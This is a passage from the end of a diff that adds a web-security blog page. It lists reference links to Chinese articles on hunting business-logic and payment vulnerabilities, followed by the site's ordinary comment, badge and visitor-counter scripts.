+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ElICF5Uja7-sNJnGhrG_9Q">JSRC——交易支付漏洞挖掘</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RMx1tqAcmqjxFvolHGAovw">JSRC——Web漏洞之逻辑漏洞挖掘</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Y8yLweZn6JbRClucLazOeg">JSRC——批量Web漏洞挖掘</a></p>
+<h2 id="Reference">Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6401#toc-5">[红日安全]Web安全Day6 - 业务逻辑漏洞实战攻防</a></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/287.html">密码找回逻辑漏洞总结</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-01-24</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">#web安全学习</a> <a class="tag-none-link" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">#逻辑漏洞</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
